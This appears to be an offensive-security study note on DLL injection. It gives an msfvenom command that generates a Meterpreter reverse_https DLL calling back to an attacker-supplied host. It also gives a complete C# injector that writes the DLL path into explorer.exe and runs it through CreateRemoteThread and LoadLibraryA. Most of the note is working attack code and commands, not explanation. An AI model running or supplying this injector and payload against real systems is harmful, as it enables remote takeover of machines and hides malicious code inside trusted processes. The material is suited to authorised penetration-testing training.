# 04.01 DLL Injection

> Section 5.2 · Write DLL path + CreateRemoteThread(LoadLibrary)

## Overview

DLL injection writes the DLL path string into the remote process and creates a remote thread at kernel32!LoadLibrary with the path as argument. LoadLibrary calls DllMain(DLL_PROCESS_ATTACH) which fires our shellcode. The DLL must be unmanaged (C/C++) — managed C# DLLs cannot be loaded into unmanaged processes this way.

## Steps

- **Generate msfvenom DLL** — `msfvenom -p windows/x64/meterpreter/reverse_https -f dll -o met.dll`.
- **Write DLL to disk** — LoadLibrary requires a file on disk.
- **OpenProcess + VirtualAllocEx** — allocate space for the DLL path string.
- **WriteProcessMemory** — write DLL path as bytes.
- **Resolve LoadLibrary** — `GetModuleHandle("kernel32.dll") + GetProcAddress("LoadLibraryA")`.
- **CreateRemoteThread** — start = LoadLibrary address, param = DLL path buffer address.

## Commands

### Generate msfvenom DLL

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=443 \
  -f dll -o met.dll
```

### C# DLL injection skeleton

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

class DllInject {
    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint a, bool b, int pid);
    [DllImport("kernel32.dll",ExactSpelling=true)] static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint n, out IntPtr w);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr f, IntPtr p, uint fl, IntPtr id);

    static void Main() {
        string dllPath = @"C:\temp\met.dll";
        byte[] pathBytes = Encoding.ASCII.GetBytes(dllPath + "\0");
        int pid = Process.GetProcessesByName("explorer")[0].Id;
        IntPtr hProc = OpenProcess(0x001F0FFF, false, pid);
        IntPtr mem = VirtualAllocEx(hProc, IntPtr.Zero, (uint)pathBytes.Length, 0x3000, 0x04);
        WriteProcessMemory(hProc, mem, pathBytes, (uint)pathBytes.Length, out _);
        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        CreateRemoteThread(hProc, IntPtr.Zero, 0, loadLib, mem, 0, IntPtr.Zero);
    }
}
```
